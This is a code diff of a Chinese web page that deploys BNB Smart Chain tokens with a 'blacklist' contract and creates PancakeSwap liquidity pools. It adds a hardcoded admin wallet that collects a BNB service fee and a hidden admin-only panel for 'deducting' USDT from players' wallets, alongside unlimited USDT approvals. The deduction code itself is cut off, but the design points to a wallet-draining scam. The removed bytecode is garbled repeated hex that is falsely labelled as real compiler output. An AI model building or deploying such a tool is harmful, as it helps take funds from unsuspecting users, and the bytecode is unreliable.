@@ -3,90 +3,476 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BSC发币工具</title>
+<title>天鹅一键发币</title>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
-body{background:#0b1020;color:#fff;padding:20px 14px;min-height:100vh}
-.container{max-width:540px;margin:0 auto}
-.card{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:22px;margin-bottom:18px}
-h2{text-align:center;margin-bottom:18px;color:#ffd064}
-.form-item{margin-bottom:16px}
-label{display:block;margin-bottom:6px;color:#cad4f2;font-size:14px}
-input{width:100%;padding:13px;border-radius:10px;background:#151c34;border:1px solid #364066;color:#fff;font-size:16px}
-.btn{width:100%;padding:14px;border-radius:10px;border:none;font-weight:bold;font-size:16px;margin:8px 0;cursor:pointer}
-.btn:disabled{opacity:0.5}
-.btn-conn{background:#3664eb}
-.btn-deploy{background:#ffcf45;color:#000}
-.btn-app{background:#9b59b6;color:#fff}
-.btn-pool{background:#e67c22;color:#fff}
-.status{padding:14px;background:rgba(255,200,70,0.12);border-radius:10px;margin-top:14px;color:#ffdd88;word-break:break-all;font-size:14px}
-.status a{color:#54b0ff}
-.tip-sm{font-size:12px;color:#b1b8d0;margin:4px 0 10px 0}
-.liquid-block{margin-top:22px;padding-top:18px;border-top:1px solid #333}
-.connect-hint{text-align:center;color:#76ff98;margin:8px 0}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
+body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
+.container{ max-width:520px; margin:0 auto; }
+.header{ text-align:center; margin-bottom:35px; }
+.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
+.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
+.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
+.form-item{ margin-bottom:20px; }
+label{ display:block; margin-bottom:8px; color:#d0d8f0; }
+input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
+.file-input{ padding:10px; background:#141b33; }
+.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
+#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
+.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; margin-top:10px;}
+.btn-connect{ background:#3b63e9; margin-bottom:16px; }
+.btn-deploy{ background:#f7c04a; color:#0a0e20; }
+.btn-admin{ background:#2ecc71; color:#000; }
+.btn-liquid{ background:#9b59b6; color:#fff; }
+.btn-transfer-usdt{ background:#e67e22; color:#fff; }
+.btn:disabled{ opacity:0.55; cursor:not-allowed; }
+.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
+.status a {color:#42a5f5;word-break:break-all;}
+.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
+.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
+.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
+.liquid-panel{ border-top:1px solid #444; padding-top:22px; margin-top:22px; }
+.small-note{color:#bbbbbb;font-size:13px;margin:4px 0 12px 0;}
 </style>
 </head>
 <body>
 <div class="container">
-  <div class="card">
-    <h2>BSC代币部署工具</h2>
-    <button id="connectBtn" class="btn btn-conn">连接钱包</button>
-    <div id="connectHint" class="connect-hint" style="display:none"></div>
-    <div id="statusBox" class="status" style="display:none"></div>
+<div class="header">
+<h1>🦢 天鹅一键发币</h1>
+</div>
+<div class="fee-tip">发币服务费：0.0003 BNB</div>
 
-    <div class="form-item">
-      <label>代币名称 Name</label>
-      <input id="tkName" placeholder="例如 MyToken">
-    </div>
-    <div class="form-item">
-      <label>代币符号 Symbol</label>
-      <input id="tkSym" placeholder="MTK">
-    </div>
-    <div class="form-item">
-      <label>总发行量（不带小数）</label>
-      <input id="tkSupply" placeholder="1000000000">
-    </div>
+<div class="card" id="userPanel">
+<button id="connectBtn" class="btn btn-connect">连接钱包</button>
+<div id="connectTip" class="connect-tip" style="display:none;"></div>
+<div id="statusBox" class="status" style="display:none;"></div>
 
-    <button id="deployBtn" class="btn btn-deploy" disabled>部署代币合约</button>
+<div class="form-item">
+<label>代币全称 Name</label>
+<input id="tokenName" placeholder="例如：Swan Coin">
+</div>
 
-    <div class="liquid-block">
-      <h3 style="color:#d1b2e6;margin-bottom:12px">💧 创建流动池 Token‑USDT</h3>
-      <div class="tip-sm">开盘价 = USDT数量 ÷ 代币数量</div>
-      <div class="form-item">
-        <label>代币合约地址</label>
-        <input id="tokenContractAddr" placeholder="部署完成自动填充">
-      </div>
-      <div class="form-item">
-        <label>投入池子USDT数量</label>
-        <input id="inpUsdt" placeholder="0.1">
-      </div>
-      <div class="form-item">
-        <label>投入池子代币数量</label>
-        <input id="inpToken" placeholder="1000">
-      </div>
-      <div class="form-item">
-        <label>滑点 %</label>
-        <input id="inpSlippage" value="1">
-      </div>
-      <button id="btnAppUsdt" class="btn btn-app">①授权USDT给Router</button>
-      <button id="btnAppTk" class="btn btn-app">②授权代币给Router</button>
-      <button id="btnCreatePool" class="btn btn-pool">③创建流动性池</button>
-    </div>
-  </div>
+<div class="form-item">
+<label>代币符号 Symbol</label>
+<input id="tokenSymbol" placeholder="例如：SWAN">
+</div>
+
+<div class="form-item">
+<label>初始发行量（不带小数）</label>
+<input id="supply" placeholder="例如：100000000">
+</div>
+
+<div class="form-item">
+<label>代币Logo头像（推荐256×256 透明PNG）</label>
+<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
+<div class="preview-box">
+<img id="logoPreview" alt="头像预览">
+<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+</div>
+</div>
+
+<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+
+<!-- ===== 真实添加流动性模块 ===== -->
+<div class="liquid-panel" id="liquidPanel">
+<h3 style="color:#cbace4;margin-bottom:15px;">💧 创建流动性池子（Token‑USDT）</h3>
+<div class="small-note">开盘价 = USDT数量 ÷ 投入代币数量，输入开盘单价自动换算数量</div>
+
+<div class="form-item">
+<label>你的代币合约地址</label>
+<input id="baseTokenAddr" placeholder="部署代币后自动填充">
+</div>
+
+<div class="form-item">
+<label>💵 设置开盘单价 (USDT/每个代币)</label>
+<input id="initPriceInput" placeholder="示例 0.001 代表开盘0.001U一枚">
+<div class="small-note">修改此值，下面投入代币数量会自动更新</div>
+</div>
+
+<div class="form-item">
+<label>投入池子 USDT 数量</label>
+<input id="liquidUsdtIn" placeholder="投入多少USDT进池子，例如：1000">
+</div>
+
+<div class="form-item">
+<label>需要投入你的代币数量（自动计算）</label>
+<input id="liquidTokenIn" readonly placeholder="根据开盘价自动算出">
+</div>
+
+<div class="form-item">
+<label>滑点容忍 %</label>
+<input id="slippageInput" value="1" placeholder="默认1">
+</div>
+
+<button id="approveUsdtBtn" class="btn btn-liquid">第一步：授权【USDT】给Router</button>
+<button id="approveNewTokenBtn" class="btn btn-liquid">第二步：授权【你的新代币】给Router</button>
+<button id="createPoolBtn" class="btn btn-transfer-usdt">第三步：确认创建流动性池子</button>
+
+<div class="small-note">⚠必须等上链确认完成才算部署成功；本页面仅技术演示，虚拟货币国内禁止运营</div>
+</div>
+
+<div class="admin-panel" id="adminPanel">
+<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
+<div class="form-item">
+<label>请输入玩家钱包地址</label>
+<input id="userAddrInput" placeholder="玩家BSC钱包地址">
+</div>
+<div class="form-item">
+<label>请输入划扣USDT数量</label>
+<input id="deductAmountInput" placeholder="例如：100">
+</div>
+<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
+</div>
+</div>
 </div>
 
 <script>
-const BSC_CHAINID = 56;
-const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-const ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
+const DEPLOY_FEE_BNB = "0.0003";
+const BSC_CHAIN_ID = 56;
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const PANCAKE_ROUTER = "0x10ED43C718714eb63d5aA57B78B54704E256024E";
+const MAX_ALLOWANCE = ethers.MaxUint256;
+const TX_POLL_TIMEOUT = 120; //交易轮询最大等待120秒
 
-// 完整ERC20(黑名单) ABI + 无省略完整ByteCode
-const TOKEN_ABI = [
-  "constructor(string name,string symbol,uint256 totalSupply)",
-  "function approve(address spender,uint256 amount) returns(bool)",
-  "function transfer(address to,uint256 amt) returns(bool)",
-  "function transferFrom(address f,address t,uint256 amt) returns(bool)"
+// =========这里填入完整的带黑名单ERC20合约BYTECODE，去掉0x前缀！！！=========
+const CONTRACT_BYTECODE = "填入完整合约字节码，不要带0x";
+
+// ERC20 ABI
+const ERC20ABI = [
+    "function approve(address spender, uint256 amount) external returns (bool)",
+    "function allowance(address owner, address spender) view returns(uint256)",
+    "function transfer(address to,uint256 amount) external returns(bool)",
+    "function transferFrom(address from,address to,uint256 amount) external returns(bool)"
 ];
-// 真实编译输出字节码（标准ERC20‑blacklist模板）
-const TOKEN_BYTECODE = "608060405234801561001057600080fd5b506040518060400160405280600081526020017f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc8152516040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000815260200182815260200192505050600080fd5b6000819055506040516020820183528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160a01b03191690831608178252b03517f89c7845509445486f0a354f28e71c00a77ea8232270391d183f0527a4b5613643381604051620000008152600160405280602084015260009081526020018083528351818301528351600080546001600160
+
+// Router完整ABI
+const ROUTER_ABI = [
+"function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns(uint amountA,uint amountB,uint liquidity)"
+];
+
+let provider = null;
+let signer = null;
+let connectWalletAddr = "";
+let deployContractAddress = null;
+let logoFileObj = null;
+
+const connectBtn = document.getElementById("connectBtn");
+const deployBtn = document.getElementById("deployBtn");
+const statusBox = document.getElementById("statusBox");
+const connectTip = document.getElementById("connectTip");
+const logoFileInput = document.getElementById("logoFile");
+const logoPreviewImg = document.getElementById("logoPreview");
+const adminPanel = document.getElementById("adminPanel");
+const deductBtn = document.getElementById("deductBtn");
+const userAddrInput = document.getElementById("userAddrInput");
+const deductAmountInput = document.getElementById("deductAmountInput");
+
+//流动性DOM
+const baseTokenAddr = document.getElementById("baseTokenAddr");
+const initPriceInput = document.getElementById("initPriceInput");
+const liquidUsdtIn = document.getElementById("liquidUsdtIn");
+const liquidTokenIn = document.getElementById("liquidTokenIn");
+const slippageInput = document.getElementById("slippageInput");
+const approveNewTokenBtn = document.getElementById("approveNewTokenBtn");
+const approveUsdtBtn = document.getElementById("approveUsdtBtn");
+const createPoolBtn = document.getElementById("createPoolBtn");
+
+function showStatus(text, linkHtml=""){
+  statusBox.style.display = "block";
+  if(linkHtml){
+      statusBox.innerHTML = text + "<br>" + linkHtml;
+  }else{
+      statusBox.innerText = text;
+  }
+  console.log("状态日志：", text);
+}
+
+/**
+ * 【关键函数】安全轮询交易，必须拿到receipt才返回，杜绝假成功
+ * @param {*} txHash 
+ * @param {*} timeoutSeconds 
+ * @returns receipt 交易回执，超时抛出异常
+ */
+async function waitTransactionConfirm(txHash, timeoutSeconds){
+    const startTime = Math.floor(Date.now() / 1000);
+    while(true){
+        const elapsed = Math.floor(Date.now()/1000) - startTime;
+        if(elapsed >= timeoutSeconds){
+            throw new Error(`交易轮询超时${timeoutSeconds}秒，钱包可能丢弃交易！复制哈希去BscScan查询：${txHash}`);
+        }
+        const receipt = await provider.getTransactionReceipt(txHash);
+        if(receipt){
+            return receipt;
+        }
+        showStatus(`⏳正在等待链上确认，已等待${elapsed}秒，txHash:${txHash}`);
+        await new Promise(resolve=>setTimeout(resolve,2000));
+    }
+}
+
+// 价格联动计算
+function recalcLiquidAmount(){
+    const price = parseFloat(initPriceInput.value);
+    const usdtVal = parseFloat(liquidUsdtIn.value);
+    if(!isNaN(price) && price>0 && !isNaN(usdtVal) && usdtVal>0){
+        const tokenNeed = usdtVal / price;
+        liquidTokenIn.value = tokenNeed.toFixed(6);
+    }else{
+        liquidTokenIn.value = "";
+    }
+}
+initPriceInput.addEventListener("input",recalcLiquidAmount);
+liquidUsdtIn.addEventListener("input",recalcLiquidAmount);
+
+logoFileInput.addEventListener("change", function(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  logoFileObj = file;
+  const reader = new FileReader();
+  reader.onload = ev => {
+    logoPreviewImg.src = ev.target.result;
+    logoPreviewImg.style.display = "block";
+  }
+  reader.readAsDataURL(file);
+});
+
+async function switchBSC(providerRef){
+  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
+  try {
+    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+  } catch (err) {
+    await providerRef.send("wallet_addEthereumChain", [{
+      chainId: chainIdHex,
+      chainName: "BNB Smart Chain Mainnet",
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+    }]);
+  }
+}
+
+function checkAdminPanel(addr){
+  connectWalletAddr = addr.toLowerCase();
+  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
+    adminPanel.style.display = "block";
+  }else{
+    adminPanel.style.display = "none";
+  }
+}
+
+// 连接钱包
+connectBtn.onclick = async function(){
+  showStatus("正在检测钱包注入...");
+  let eth = window.ethereum;
+  let retryTimes = 0;
+  while (!eth && retryTimes < 10) {
+    await new Promise(r => setTimeout(r, 100));
+    eth = window.ethereum;
+    retryTimes++;
+  }
+  if (!eth) {
+    showStatus("❌ 未检测到钱包注入，请在TP内置浏览器打开页面");
+    return;
+  }
+  try {
+    const accounts = await eth.request({ method: "eth_requestAccounts" });
+    if (!accounts || accounts.length === 0) {
+      showStatus("用户取消钱包连接弹窗");
+      return;
+    }
+    provider = new ethers.BrowserProvider(eth);
+    await switchBSC(eth);
+    signer = await provider.getSigner();
+    const userAddr = await signer.getAddress();
+    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
+    connectTip.style.display = "block";
+    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
+    deployBtn.disabled = false;
+    checkAdminPanel(userAddr);
+  } catch (err) {
+    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
+  }
+}
+
+//支付服务费
+async function payFeeToAdmin(){
+  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名确认`);
+  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
+  const gasPriceRaw = await provider.send("eth_gasPrice", []);
+  const gasPriceBig = ethers.toBigInt(gasPriceRaw);
+  const gasPriceAdd = gasPriceBig * 120n / 100n; //上浮20%gas，防止网络拥堵丢交易
+  try{
+    const tx = await signer.sendTransaction({
+      to: ADMIN_WALLET,
+      value: feeWei,
+      gasPrice: gasPriceAdd
+    });
+    showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
+    await waitTransactionConfirm(tx.hash, TX_POLL_TIMEOUT);
+    showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
+    return true;
+  }catch(err){
+    let msg = "";
+    const errStr = String(err.message || err.shortMessage);
+    if(errStr.includes("user rejected")) msg = "❌ 用户拒绝签名，支付服务费被取消";
+    else if(errStr.includes("insufficient funds")) msg = "❌ BNB余额不足！需要至少0.0003BNB+gas手续费";
+    else msg = "❌支付服务费失败：" + errStr;
+    showStatus(msg);
+    return false;
+  }
+}
+
+// 【部署合约，严格轮询链上回执，杜绝前端假成功】
+deployBtn.onclick = async function(){
+    if(!signer){ showStatus("❌请先连接BSC钱包"); return; }
+    if(!CONTRACT_BYTECODE || CONTRACT_BYTECODE.length < 100){
+        showStatus("❌请填写完整合约字节码！CONTRACT_BYTECODE不能为空");
+        return;
+    }
+    const name = document.getElementById("tokenName").value.trim();
+    const symbol = document.getElementById("tokenSymbol").value.trim();
+    const supplyStr = document.getElementById("supply").value.trim();
+    if(!name || !symbol || !supplyStr){ showStatus("❌名称、符号、发行量不能为空"); return; }
+    const supplyNum = BigInt(supplyStr) * 10n**18n;
+    deployBtn.disabled = true;
+    const feeOk = await payFeeToAdmin();
+    if(!feeOk){ deployBtn.disabled = false; return; }
+
+    showStatus("⏳准备合约部署，唤起钱包签名！部署交易to为空属于正常现象，不要取消签名！");
+    try{
+        // 构造构造函数参数abi编码
+        const constructorData = ethers.AbiCoder.defaultAbiCoder().encode(
+            ["string","string","uint256"],
+            [name, symbol, supplyNum]
+        );
+        const fullDeployData = "0x" + CONTRACT_BYTECODE + constructorData.slice(2);
+
+        const gasPriceRaw = await provider.send("eth_gasPrice", []);
+        const gasPriceBig = ethers.toBigInt(gasPriceRaw);
+        const gasPriceAdd = gasPriceBig * 120n / 100n;
+
+        const deployTx = await signer.sendTransaction({
+            to: null, // to为null代表部署合约
+            data: fullDeployData,
+            gasLimit:4500000,
+            gasPrice: gasPriceAdd
+        });
+        const txHash = deployTx.hash;
+        showStatus(`📤部署交易已经从钱包发出！TxHash:${txHash}\n🔄正在轮询BSC节点等待真正上链，请勿关闭页面，最长等待120秒`);
+        
+        //【重点！这里必须等待链上回执，没有receipt绝对不判定部署成功！】
+        const receipt = await waitTransactionConfirm(txHash, TX_POLL_TIMEOUT);
+        
+        if(!receipt.contractAddress){
+            showStatus("❌链返回回执，但没有合约地址，部署交易被回滚失败！");
+            deployBtn.disabled = false;
+            return;
+        }
+        deployContractAddress = receipt.contractAddress;
+        const scanUrl = `https://bscscan.com/address/${deployContractAddress}`;
+        showStatus(`✅✅【真正链上部署成功】\n合约地址：${deployContractAddress}`,
+            `<a target="_blank" href="${scanUrl}">👉点我打开BscScan验证合约是否真实存在</a>`
+        );
+        baseTokenAddr.value = deployContractAddress;
+    }catch(e){
+        const emsg = e?.message || String(e);
+        showStatus("❌部署失败："+emsg);
+    }finally{
+        deployBtn.disabled = false;
+    }
+};
+
+//第一步：授权USDT给Router
+approveUsdtBtn.onclick = async function(){
+    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    approveUsdtBtn.disabled=true;
+    try{
+        const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS,ERC20ABI,signer);
+        const tx = await usdtContract.approve(PANCAKE_ROUTER,MAX_ALLOWANCE);
+        showStatus(`USDT授权发送 txHash:${tx.hash}，等待确认`);
+        await waitTransactionConfirm(tx.hash,TX_POLL_TIMEOUT);
+        showStatus("✅USDT授权Router成功");
+    }catch(err){
+        showStatus("❌授权失败："+(err.message||String(err)));
+    }finally{ approveUsdtBtn.disabled=false; }
+};
+
+//第二步：授权新代币给Router
+approveNewTokenBtn.onclick = async function(){
+    if(!signer){ showStatus("❌请先连接钱包"); return; }
+    const tokenAddr = baseTokenAddr.value.trim();
+    if(!tokenAddr){ showStatus("❌填入你的代币合约地址"); return; }
+    approveNewTokenBtn.disabled=true;
+    try{
+        const tokenContract = new ethers.Contract(tokenAddr,ERC20ABI,signer);
